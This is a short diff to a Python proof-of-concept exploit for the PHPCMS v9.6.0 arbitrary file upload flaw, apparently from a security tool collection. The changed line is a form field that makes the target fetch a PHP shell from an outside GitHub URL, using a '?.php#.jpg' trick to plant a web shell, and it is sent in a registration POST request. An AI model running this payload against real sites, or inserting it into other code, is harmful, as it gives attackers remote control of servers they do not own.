@@ -11,7 +11,7 @@ def poc(url):
         'username': 'testxxx',
         'password': 'testxxxxx',
         'email': 'test@texxxst.com',
-        'info[content]': '<img src=http://localhost/PHPCMS/PHPCMS_v9.6.0/shell.txt?.php#.jpg>', 
+        'info[content]': '<img src=https://raw.githubusercontent.com/SecWiki/CMS-Hunter/master/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/shell.txt?.php#.jpg>', 
         'dosubmit': '1',
     }
     rep = requests.post(u, data=data)
